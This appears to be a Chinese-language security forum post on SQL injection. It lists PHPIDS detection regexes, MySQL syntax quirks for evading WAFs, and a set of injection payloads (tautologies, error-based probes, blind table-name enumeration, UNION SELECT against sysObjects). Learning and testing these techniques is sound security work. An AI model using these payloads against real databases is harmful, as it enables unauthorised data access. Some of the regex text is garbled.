> (?:;|#|--)\s(?:update|insert)\s\w{2,})|(?:[^\w]SET\s@\w+)|(?:(?:n?and|x?or|not
> ||||\&\&)[\s(]+\w+[\s)][!=+]+[\s\d]["=()])  
>
> (?:"\s+and\s=\W)|(?:(\sselect\s\w+\s()|(?:*\/from)|(?:+\s\d+\s+\s@)|(?:\w"\s(?:[-+=|@]+\s)+[\d(])|(?:coalesce\s(|@@\w+\s[^\w\s])|(?:\W!  
>
> +"\w)|(?:";\s(?:if|while|begin))|(?:"[\s\d]+=\s\d)|(?:order\s+by\s+if\w\s()|(?:[\s(]+case\d\W.+[tw]hen[\s(])  
> (?:(select|;)\s+(?:benchmark|if|sleep)\s?(\s(?\s\w+)  
>
> (?:create\s+function\s+\w+\s+returns)|(?:;\s(?:select|create|rename|truncate|lo
> ad|alter|delete|update|insert|desc)\s[(](https://bbs.ichunqiu.com/%5D?%5Cw%7B2%2C%7D)  
> (?:alter\s\w+.character\s+set\s+\w+)|(";\swaitfor\s+time\s+")|(?:";.:\sgoto)  
>
> (?:procedure\s+analyse\s()|(?:;\s(declare|open)\s+[\w-]+)|(?:create\s+(procedure|function)\s\w+\s(\s)\s-)|(?:declare[^\w]+[@#]\s\w+)|(exec\s\  
> (\s@)  
>
> (?:select\spg_sleep)|(?:waitfor\sdelay\s?"+\s?\d)|(?:;\sshutdown\s(?:;|--|#|\/*|{))  
>
> (?:*ec\s+xp_cmdshell)|(?:"\s!\s["\w])|(?:from\W+informationschema\W)|(?:(?:(?:current)?user|database|schema|connec
> tion_id)\s([^)])|(?:";?  
> \s(?:select|union|having)\s[^\s])|(?:\wiif\s()|(?:exec\s+master.)|(?:union
> select @)|(?:union[\w(\s]select)|(?:select.\w?user()|(?:into[\s+]+  
> (?:dump|out)file\s")  
>
> (?:merge.using\s()|(execute\simmediate\s")|(?:\W+\d\shaving\s[^\s-])|(?:match\s[\w(),+-]+\sagainst\s()  
>
> (?:,.[)\da-f"]"(?:"."|\Z|[^"]+))|(?:\Wselect.+\Wfrom)|((?:select|create|rename|truncate|load|alter|delete|up
> date|insert|desc)\s(\sspace\s()  
> (?:[\$(?:ne|eq|lte?|gte?|n?in|mod|all|size|exists|type|slice|or)])  
> (?:(sleep((\s)(\d)(\s))|benchmark((.)\,(.))))  
> (?:(union(.)select(.)from))  
>
> (?:^(-0000023456|4294967295|4294967296|2147483648|2147483647|0000012345|-2147483648|-2147483649|0000023456|2.2250738585072007e-308|1e309)$)

PHPIDS使用的一些正则表达式0.7。

### NULL的别名

在MySQL中，NULL可以写为\ N区分大小写。 \ n不是null。<br>  
这意味着任何在用户输入上执行“to_lower”并查找“null”的WAF将错过这种情况。

### 浮点

> digits  
> digits[.]  
> digits[.]digits  
> digits[eE]digits  
> digits[eE][+-]digits  
> digits[.][eE]digits  
> digits[.]digits[eE]digits  
> digits[.]digits[eE][+-]digits  
> [.]digits  
> [.]digits[eE]digits  
> [.]digits[eE][+-]digits

可选以[+ - ]开头

例外：1.AND 2（“1.”“AND”之间没有空格）一些解析器接受，有些则不接受。 1e1 vs. 1e1.0？未定义

十六进制文字

> 0xDEADbeef

0x区分大小写。

二进制文字

> b'10101010'<br>  
> 0b010101

C风格字符串合并<br>  
C风格的连续字符串合并为一个。

> SELECT 'foo' "bar";

Ad-Hoc Charset

> _charset'....'<br>  
> _latin1'.....'<br>  
> _utf8'....'<br>

Operators

> !=, <=>

### 表达

使用“OR 1 = 1”的公共查询扩展名。 除了使用文字之外，还可以使用函数：

> COS（0）= SIN（PI（）/ 2）<br>  
> COS（@VERSION）= -SIN（@VERSION + PI（）/ 2）

### “IN”列表

> WHERE id IN (1,2,3,4)

这些必须在任何平台，框架或语言中手动创建，不对此构造进行API或参数绑定。 没有一致，安全的方法来使这个（除了约定，验证）未定义

### ESP：

正常的SQL注入：

> 1 OR 1=1

使用封装数据的正常SQL注入：

> 1' OR '1'='1

盲SQL注入以抛出错误以验证封装不起作用。 这里的目标是抛出一个错误，使应用程序向我们显示它没有正确封装引号：

> 1'1

使用EXEC创建错误的盲SQL注入：

> 1 EXEC SP (or EXEC XP)

盲SQL注入检测（如果我们排除了AND 1 = 1部分，那么如果我们得到过滤就不会给我们相同的结果。如果它确实给我们相同的结果它表明应用程序易受攻击）：

> 1 AND 1=1

盲注SQL注入尝试通过潜在的名称进行强力迭代来定位表名（您必须重命名表名，直到找到匹配项）：

> 1' AND 1=(SELECT COUNT(*) FROM tablenames); --
使用反斜杠避开逃逸（这假定应用程序使用另一个单引号注释掉单引号，并在它之前引入反斜杠，它会注释掉过滤器添加的单引号）。
这种类型的过滤器由mySQL的mysql_real_escape_string（）和PERL的DBD方法$ dbh-> quote（）应用：

> \'; DESC users; --
通过尝试使用上面看到的反斜杠方法创建错误来更盲目的SQL注入：

> 1\'1

通过调用伪表创建错误。 这可以通过调用不存在的表来尝试创建错误来帮助公开易受攻击的应用程序（尝试使用和不使用引号）：

> 1' AND non_existant_table = '1

枚举数据库表名。 通过将116更改为不同的数字，您可以使用logrithmic reduction来查找数据库表名的第一个char。
然后迭代第一个1中的1，你最终可以获得整个表名。

> 1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE
> xtype='U'), 1, 1))) 116

使用SQL Server中的sysObjects表查找用户提供的表：

> 1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --
[有问题大家可以留言哦~也欢迎大家到春秋论坛中来玩耍呢！
](https://bbs.ichunqiu.com/portal.php?from=beef)[>>>点击跳转](https://bbs.ichunqiu.com/portal.php?from=beef)  

